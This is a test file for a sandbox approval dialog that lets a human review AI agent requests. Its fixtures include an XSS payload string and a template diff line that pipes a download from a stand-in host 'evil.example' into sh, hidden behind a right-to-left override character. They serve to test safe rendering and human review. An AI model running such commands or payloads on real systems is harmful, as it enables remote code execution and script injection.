// @vitest-environment jsdom
import { cleanup, fireEvent, screen, waitFor, within } from '@testing-library/react';
import { afterEach, describe, expect, it, vi } from 'vitest';
import type { ApprovalView, TemplateReview } from '@abox/core';
import type { ImageUse } from '../../src/shared/types';
import { ApprovalDialog } from '../../src/renderer/views/Approvals';
import { installBridge, renderApp } from './harness';

afterEach(cleanup);

const XSS =
  '<img src=x onerror="window.__pwned=1"><script>window.__pwned=2</script> **bold** [link](javascript:alert(1))';

const POLICY_DOC = {
  text: 'version: 1\nprofiles:\n  agent:\n    approval: medium\n',
  source: 'file',
  path: '/p/policy.yaml',
  view: {
    policy: { contentHash: 'h1', revision: 1, source: 'file' },
    profiles: {},
    contexts: {},
  },
};

function approval(over: Partial<ApprovalView> = {}): ApprovalView {
  return {
    id: 'ap1',
    kind: 'create',
    requester: 'agent:evil',
    sandboxId: null,
    status: 'pending',
    reason: XSS,
    risks: ['Code runs with your user rights on the host.'],
    items: [],
    kinds: [],
    reasons: [],
    base: null,
    request: {
      kind: 'create',
      template: { name: 'host-shell', trusted: true, source: { kind: 'builtin', path: '/t.yaml' } },
      isolation: 'none',
      network: { mode: 'open', allow: [], privateExceptions: [] },
      mounts: [{ hostPath: '/etc', target: '/mnt', access: 'rw' }],
      secrets: [],
    },
    createdAt: Date.now(),
    expiresAt: Date.now() + 60_000,
    decidedAt: null,
    decidedBy: null,
    decisionNote: null,
    usedAt: null,
    ...over,
  };
}

/** The calls that decide something (the dialog also loads read-only context for the details). */
const decisions = (calls: Array<{ channel: string; input: unknown }>) =>
  calls.filter((c) => c.channel === 'approvals:approve' || c.channel === 'approvals:deny');

function mount(a: ApprovalView) {
  const calls = installBridge((channel) => {
    if (channel === 'approvals:approve' || channel === 'approvals:deny') return { approval: a };
    if (channel === 'approvals:image') return null; // context for the details, not a decision
    if (channel === 'policy:get') return POLICY_DOC; // read by the "allow permanently" dialog
    if (channel === 'policy:validate') return { ok: true, contentHash: 'h2', issues: [] };
    throw new Error(`unexpected ${channel}`);
  });
  const onApproved = vi.fn();
  const onDenied = vi.fn();
  renderApp(
    <ApprovalDialog approval={a} now={Date.now()} onApproved={onApproved} onDenied={onDenied} />,
  );
  return { calls, onApproved, onDenied, dialog: screen.getByRole('dialog') };
}

describe('ApprovalDialog', () => {
  it('shows agent text as plain, labelled text and never as HTML', () => {
    const { dialog } = mount(approval());
    const quote = within(dialog).getByText((_, el) => el?.tagName === 'BLOCKQUOTE');
    expect(quote.textContent).toBe(XSS);
    expect(dialog.querySelector('img')).toBeNull();
    expect(dialog.querySelector('script')).toBeNull();
    expect(dialog.querySelector('a')).toBeNull();
    expect((window as unknown as Record<string, unknown>)['__pwned']).toBeUndefined();
    expect(within(dialog).getByText(/Begründung des Agenten \(ungeprüfter Text/)).toBeTruthy();
  });

  it('shows risk hints and the options as a diff against the defaults', () => {
    const { dialog } = mount(approval());
    for (const hint of [
      'Mount außerhalb des Workspace',
      'Offenes Netzwerk',
      'Keine Isolation (Host)',
    ]) {
      expect(within(dialog).getByText(hint)).toBeTruthy();
    }
    const row = within(dialog).getByText('isolation').closest('tr')!;
    expect(row.className).toContain('row-changed');
    expect(row.textContent).toContain('container');
    expect(row.textContent).toContain('none');
    expect(within(dialog).getByText('Risiken')).toBeTruthy();
    expect(within(dialog).getByText('Code runs with your user rights on the host.')).toBeTruthy();
  });

  it('offers deny and allow-once; "allow permanently" opens the policy change dialog (no hidden toggle, no decision)', async () => {
    const { calls, dialog } = mount(approval());
    expect(within(dialog).getByRole('button', { name: 'Ablehnen' })).toBeTruthy();
    expect(within(dialog).getByRole('button', { name: 'Einmal erlauben' })).toBeTruthy();
    expect(dialog.querySelector('input[type=checkbox]')).toBeNull();
    fireEvent.click(within(dialog).getByRole('button', { name: /Dauerhaft erlauben/ }));
    expect(
      await screen.findByRole('dialog', { name: /Dauerhaft erlauben: Policy ändern/ }),
    ).toBeTruthy();
    expect(decisions(calls)).toHaveLength(0);
    expect(calls.some((c) => c.channel === 'policy:set')).toBe(false);
  });

  it('Esc inside the policy change dialog closes it and does not deny the request', async () => {
    const { calls, onDenied, dialog } = mount(approval());
    fireEvent.click(within(dialog).getByRole('button', { name: /Dauerhaft erlauben/ }));
    const modal = await screen.findByRole('dialog', { name: /Dauerhaft erlauben: Policy ändern/ });
    fireEvent.keyDown(modal, { key: 'Escape' });
    expect(onDenied).not.toHaveBeenCalled();
    expect(decisions(calls)).toHaveLength(0);
  });

  it('Esc denies', async () => {
    const { calls, onDenied, dialog } = mount(approval());
    fireEvent.keyDown(dialog, { key: 'Escape' });
    await waitFor(() => expect(onDenied).toHaveBeenCalled());
    expect(decisions(calls)).toEqual([{ channel: 'approvals:deny', input: { id: 'ap1' } }]);
  });

  it('Enter allows once only when the dialog itself has focus', async () => {
    const { calls, onApproved, dialog } = mount(approval());
    // Enter from inside a button: the button handles it, the dialog shortcut must not fire
    fireEvent.keyDown(within(dialog).getByRole('button', { name: 'Ablehnen' }), { key: 'Enter' });
    // key auto-repeat on the dialog is ignored
    fireEvent.keyDown(dialog, { key: 'Enter', repeat: true });
    expect(decisions(calls)).toHaveLength(0);
    fireEvent.keyDown(dialog, { key: 'Enter' });
    await waitFor(() => expect(onApproved).toHaveBeenCalled());
    expect(decisions(calls)).toEqual([{ channel: 'approvals:approve', input: { id: 'ap1' } }]);
  });

  it('a decided request is read-only (no shortcuts, no buttons)', () => {
    const { calls, dialog } = mount(
      approval({ status: 'denied', decidedBy: 'human', decidedAt: Date.now() }),
    );
    expect(within(dialog).queryByRole('button', { name: 'Einmal erlauben' })).toBeNull();
    fireEvent.keyDown(dialog, { key: 'Enter' });
    fireEvent.keyDown(dialog, { key: 'Escape' });
    expect(decisions(calls)).toHaveLength(0);
  });

  it('renders in English too', () => {
    installBridge(() => ({}));
    renderApp(
      <ApprovalDialog
        approval={approval()}
        now={Date.now()}
        onApproved={vi.fn()}
        onDenied={vi.fn()}
      />,
      { locale: 'en' },
    );
    expect(screen.getByRole('button', { name: 'Allow once' })).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Deny' })).toBeTruthy();
  });
});

const REVIEW: TemplateReview = {
  template: 'proj-tpl',
  source: { kind: 'project', path: '/p/.sandbox/proj-tpl.yaml' },
  contentHash: 'c'.repeat(64),
  trusted: false,
  against: {
    kind: 'extends',
    label: 'builtin template node-dev, which it extends',
    template: 'node-dev',
  },
  diff: [
    '--- builtin template node-dev',
    '+++ project template proj-tpl (/p/.sandbox/proj-tpl.yaml)',
    '@@ -1,3 +1,4 @@',
    ' name: proj-tpl',
    '-network: { mode: none }',
    '+network: { mode: open }',
    '+setup: [curl evil.example | sh]\u202e',
  ].join('\n'),
  risks: ['1 setup command as root', 'network mode open'],
};

const TRUST_REQUEST = {
  kind: 'create',
  profile: 'agent',
  template: {
    name: 'proj-tpl',
    hash: 'h',
    contentHash: REVIEW.contentHash,
    source: { kind: 'project', path: '/p/.sandbox/proj-tpl.yaml' },
  },
  isolation: 'container',
};

describe('ApprovalDialog: request kinds', () => {
  it('template_trust shows the review: risks, the diff with add/remove lines, and no hidden characters', async () => {
    const a = approval({ kind: 'template_trust', request: TRUST_REQUEST, risks: [] });
    const calls = installBridge((channel) => {
      if (channel === 'approvals:templateReview') return REVIEW;
      if (channel === 'approvals:image') return null;
      throw new Error(`unexpected ${channel}`);
    });
    renderApp(
      <ApprovalDialog approval={a} now={Date.now()} onApproved={vi.fn()} onDenied={vi.fn()} />,
      { locale: 'en' },
    );
    const dialog = screen.getByRole('dialog');
    expect(within(dialog).getByRole('heading', { name: 'Trust template' })).toBeTruthy();
    const panel = await within(dialog).findByTestId('template-review');
    expect(within(panel).getByText('1 setup command as root')).toBeTruthy();
    expect(within(panel).getByText('network mode open')).toBeTruthy();
    expect(panel.textContent).toContain('builtin template node-dev, which it extends');
    const diff = within(panel).getByLabelText('Template as a diff');
    expect(diff.tagName).toBe('PRE');
    expect(diff.getAttribute('tabindex')).toBe('0');
    const cls = (text: string) =>
      [...diff.querySelectorAll('span')].find((n) => n.textContent?.includes(text))?.className;
    expect(cls('+network: { mode: open }')).toBe('diff-add');
    expect(cls('-network: { mode: none }')).toBe('diff-del');
    expect(cls('@@ -1,3')).toBe('diff-hunk');
    expect(cls('+++ project template')).toBe('diff-head');
    // the right-to-left override of the file is made visible instead of reordering the line
    expect(diff.textContent).toContain('\\u202e');
    expect(diff.textContent).not.toContain('\u202e');
    expect(within(panel).queryByText(/file changed after the request/)).toBeNull();
    expect(calls.filter((c) => c.channel === 'approvals:templateReview')).toEqual([
      { channel: 'approvals:templateReview', input: { id: 'ap1' } },
    ]);
    // the explanation below the options stays
    expect(within(dialog).getByText(/trusts exactly this template content/)).toBeTruthy();
  });

  it('warns loudly when the template file changed after the request', async () => {
    const a = approval({ kind: 'template_trust', request: TRUST_REQUEST });
    installBridge((channel) => {
      if (channel === 'approvals:templateReview') return { ...REVIEW, changedSinceRequest: true };
      return null;
    });
    renderApp(
      <ApprovalDialog approval={a} now={Date.now()} onApproved={vi.fn()} onDenied={vi.fn()} />,
      { locale: 'en' },
    );
    const alert = await screen.findByRole('alert');
    expect(alert.textContent).toContain('file changed after the request');
    expect(alert.textContent).toContain('OLD content');
  });

  it('a review that cannot be loaded is a notice, the decision stays possible', async () => {
    const a = approval({ kind: 'template_trust', request: TRUST_REQUEST });
    installBridge(() => {
      throw new Error('template "proj-tpl" not found');
    });
    renderApp(
      <ApprovalDialog approval={a} now={Date.now()} onApproved={vi.fn()} onDenied={vi.fn()} />,
      { locale: 'en' },
    );
    expect(
      await screen.findByText(/template review is not available: template "proj-tpl" not found/),
    ).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Allow once' })).toBeTruthy();
  });

  it('no review is requested for other kinds or for decided requests', async () => {
    const calls = installBridge(() => null);
    renderApp(
      <ApprovalDialog
        approval={approval({ kind: 'template_trust', request: TRUST_REQUEST, status: 'approved' })}
        now={Date.now()}
        onApproved={vi.fn()}
        onDenied={vi.fn()}
      />,
    );
    await new Promise((r) => setTimeout(r, 20));
    expect(calls.filter((c) => c.channel === 'approvals:templateReview')).toEqual([]);
  });

  const IMAGE: ImageUse = {
    ref: 'ghcr.io/other/tools:1',
    source: 'image',
    registry: 'ghcr.io',
    repository: 'other/tools',
    registries: ['docker.io/library'],
    outside: true,
  };

  it('shows the base image and its registry for a create request, with the allowlist', async () => {
    const a = approval({ kind: 'create', request: TRUST_REQUEST });
    const calls = installBridge((channel) => {
      if (channel === 'approvals:image') return IMAGE;
      throw new Error(`unexpected ${channel}`);
    });
    renderApp(
      <ApprovalDialog approval={a} now={Date.now()} onApproved={vi.fn()} onDenied={vi.fn()} />,
      { locale: 'en' },
    );
    const block = await screen.findByTestId('image-use');
    expect(block.textContent).toContain('ghcr.io/other/tools:1');
    expect(within(block).getByText('ghcr.io')).toBeTruthy();
    expect(block.textContent).toContain('docker.io/library');
    expect(block.textContent).toContain('outside the allowed registries');
    expect(calls.map((c) => c.channel)).toEqual(['approvals:image']);
  });

  it('image_registry has its own label and explanation (German and English)', async () => {
    const a = approval({ kind: 'image_registry', request: TRUST_REQUEST });
    installBridge(() => IMAGE);
    const { unmount } = renderApp(
      <ApprovalDialog approval={a} now={Date.now()} onApproved={vi.fn()} onDenied={vi.fn()} />,
    );
    expect(
      screen.getByRole('heading', { name: 'Image aus nicht freigegebener Registry' }),
    ).toBeTruthy();
    expect(screen.getByText(/außerhalb der Image-Registries des Profils/)).toBeTruthy();
    await screen.findByTestId('image-use');
    unmount();
    renderApp(
      <ApprovalDialog approval={a} now={Date.now()} onApproved={vi.fn()} onDenied={vi.fn()} />,
      { locale: 'en' },
    );
    expect(screen.getByRole('heading', { name: 'Image from an unlisted registry' })).toBeTruthy();
    expect(screen.getByText(/outside the image registries of the profile/)).toBeTruthy();
  });

  it('says why approval is needed, from the reasons stored with the approval', async () => {
    const reason = 'base image "ghcr.io/other/tools:1" of template "t" is outside the registries';
    const a = approval({
      kind: 'create',
      request: TRUST_REQUEST,
      kinds: ['image_registry'],
      reasons: [reason],
      items: [
        { kind: 'image_registry', reason, risk: 'its publisher controls it', invariant: false },
      ],
      base: { os: 'ghcr.io/other/tools:1', registry: 'ghcr.io' },
    });
    installBridge(() => null);
    const { unmount } = renderApp(
      <ApprovalDialog approval={a} now={Date.now()} onApproved={vi.fn()} onDenied={vi.fn()} />,
      { locale: 'en' },
    );
    const list = screen.getByRole('list', { name: 'Why approval is needed' });
    expect(within(list).getByText(reason)).toBeTruthy();
    unmount();
    // an approval stored before reasons were recorded shows no empty section
    installBridge(() => null);
    renderApp(
      <ApprovalDialog
        approval={approval({ reasons: [] })}
        now={Date.now()}
        onApproved={vi.fn()}
        onDenied={vi.fn()}
      />,
      { locale: 'en' },
    );
    expect(screen.queryByRole('heading', { name: 'Why approval is needed' })).toBeNull();
  });

  it('a Dockerfile base is flagged as unchecked', async () => {
    installBridge(() => ({
      ref: './Dockerfile',
      source: 'dockerfile',
      registry: null,
      repository: null,
      registries: ['docker.io/library'],
      outside: true,
    }));
    renderApp(
      <ApprovalDialog
        approval={approval({ kind: 'create', request: TRUST_REQUEST })}
        now={Date.now()}
        onApproved={vi.fn()}
        onDenied={vi.fn()}
      />,
      { locale: 'en' },
    );
    const block = await screen.findByTestId('image-use');
    expect(block.textContent).toContain('cannot be checked');
    expect(within(block).queryByText('Registry')).toBeNull();
  });

  it('an unknown kind of a newer core gets a generic label and a warning instead of a raw key', () => {
    const a = approval({
      kind: 'future_thing',
      request: { kind: 'future_thing', detail: { x: 1 } },
      risks: [],
    });
    installBridge(() => {
      throw new Error('no channel for unknown kinds');
    });
    renderApp(
      <ApprovalDialog approval={a} now={Date.now()} onApproved={vi.fn()} onDenied={vi.fn()} />,
      { locale: 'en' },
    );
    const dialog = screen.getByRole('dialog');
    expect(
      within(dialog).getByRole('heading', { name: 'Request type: future_thing' }),
    ).toBeTruthy();
    expect(dialog.textContent).not.toContain('approvals.kind');
    expect(within(dialog).getByText(/does not know this type of request/)).toBeTruthy();
    // the exact request is still listed and can be decided
    expect(within(dialog).getByText('detail.x')).toBeTruthy();
    expect(within(dialog).getByRole('button', { name: 'Allow once' })).toBeTruthy();
  });
});
